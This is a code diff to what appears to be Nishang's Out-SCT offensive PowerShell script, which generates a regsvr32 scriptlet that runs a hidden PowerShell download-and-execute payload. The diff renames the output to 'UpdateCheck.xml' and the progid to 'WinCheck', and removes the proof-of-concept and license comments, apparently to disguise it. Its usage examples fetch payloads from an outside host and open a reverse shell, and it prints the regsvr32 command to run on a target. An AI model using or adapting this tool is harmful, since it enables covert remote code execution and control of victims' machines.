@@ -28,7 +28,7 @@ Path to the directory where the files would be saved. Default is the current dir
 PS > Out-SCT -PayloadURL http://192.168.230.1/Invoke-PowerShellUdp.ps1 -Arguments "Invoke-PowerShellUdp -Reverse -IPAddress 192.168.230.154 -Port 53"
 
 Use above when you want to use the default payload, which is a powershell download and execute one-liner. A file 
-named "Style.js" would be generated in the current directory.
+named "UpdateCheck.xml" would be generated in the current directory.
 
 
 PS > Out-SCT -PayloadURL http://192.168.230.1/Powerpreter.psm1 -Arguments "Get-Information;Get-Wlan-Keys"
@@ -68,27 +68,24 @@ https://github.com/samratashok/nishang
     #Check if the payload has been provided by the user
     if(!$Payload)
     {
-        $Payload = "IEX ((New-Object Net.WebClient).DownloadString('$PayloadURL'));$Arguments"
+        $Payload = "powershell IEX ((New-Object Net.WebClient).DownloadString('$PayloadURL'));$Arguments"
     }  
-    
+    #Below code comes from https://gist.github.com/subTee/24c7d8e1ff0f5602092f58cbb3f7d302
     $cmd = @"
 <?XML version="1.0"?>
 <scriptlet>
 <registration 
-    progid="PoC"
+    progid="WinCheck"
     classid="{F0001111-0000-0000-0000-0000FEEDACDC}" >
-	<!-- Proof Of Concept - Casey Smith @subTee -->
-	<!--  License: BSD3-Clause -->
-	<script language="JScript">
+
+    <script language="JScript">
 		<![CDATA[
-	
-			ps = 'powershell.exe -w h -nologo -noprofile -ep bypass ';
+           	ps = 'powershell.exe -w h -nologo -noprofile -ep bypass ';
             c = "$Payload";
             r = new ActiveXObject("WScript.Shell").Run(ps + c,0,true);
-	
 		]]>
-</script>
-</registration>
+	</script>
+    </registration>
 </scriptlet>
 "@
 
@@ -99,3 +96,4 @@ https://github.com/samratashok/nishang
     Write-Output "Run the following command on the target:"
     Write-Output "regsvr32.exe /u /n /s /i:[WebServerURL]/UpdateCheck.xml scrobj.dll"
 }
+
